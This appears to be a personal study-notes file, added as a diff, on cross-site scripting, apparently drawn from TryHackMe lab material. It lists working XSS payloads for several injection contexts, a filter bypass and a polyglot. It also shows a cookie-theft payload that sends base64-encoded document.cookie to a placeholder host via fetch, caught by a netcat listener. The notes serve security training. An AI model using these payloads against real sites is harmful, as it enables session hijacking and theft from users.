@@ -1,0 +1,81 @@
+0) NORMAL XSS LOOKS LIKE: 
+
+(<script>alert('test');</script>)
+
+================================================================
+1) Reflected XSS: see image escaping input tag,see image Escaping textarea tag in XSS  
+
+A) input tag: if your payload was being inserted in an input tag it can't run because there's 2 quotation marks like: <input value="HERE GOES THE PAYLOAD"> so knowing this we can close the quotation marks before they can impact our payload(The important part of the payload is the "> which closes the value parameter and then closes the input tag.) like so: "> and here goes our payload:
+
+"><script>alert('THM');</script>
+
+B) textarea tag: knowing our payload is in textarea tag we have to escape it we do so by closing the textarea tag (The important part of the above payload is </textarea>, which causes the textarea element to close so the script will run.) like so: </textarea> and here goes our payload: 
+
+</textarea><script>alert('THM');</script>
+
+C) script tag: knowing our payload gets stored in a <script> tag like the image Escaping script tag we can escape the single quotation mark from javascript (You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.)
+
+';alert('THM');//
+
+D) filters: if there's a filter removing words such as script we can trick the filter by typing the word twice ofcourse depending on what you see as the result in the page source if that was available to you. 
+
+<sscriptcript>alert('THM');</sscriptcript>
+
+E) img tag: You can see that the > < characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.
+
+Let's change our payload to reflect this /images/cat.jpg" onload="alert('THM'); and then viewing the page source, and you'll see how this will work.
++++++++++++++++++++++++++++++++++++++++++++
+Polyglots:
+
+An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
++++++++++++++++++++++++++++++++++++++++++++
+
++++++++++++++++++++++++++++++++++++++++++++
+NOTE: after you have successfully escaped all filters and tags you can get the users cookies to a listening netcat instace like so: 
+
+First setup a netcat listener to receive the request made by javascript
+
+Second BYPASS whatever filter is there and then <script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+
+Let's breakdown the payload:
+The <script>tag opens open an area for us to write JavaScript.
+The fetch() command makes an HTTP request.
+{URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
+?cookie= is the query string that will contain the victim's cookies.
+btoa() command base64 encodes the victim's cookies.
+document.cookie accesses the victim's cookies for the Acme IT Support Website.
+
+</script>closes the JavaScript code block.
++++++++++++++++++++++++++++++++++++++++++++
+
+================================================================
+2) Stored XSS: 
+As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
+
+Example Scenario:
+
+A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.
+
+================================================================
+3) DOM based XSS: 
+DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.
+
+Example Scenario:
+
+The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
+
+================================================================
+4) Blind XSS ; similar to HTB CTF web challenge 2022
+
+Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
+
+Example Scenario:
+
+A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.
+
+HOW TO TEST FOR BLIND CSS: 
+When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
+
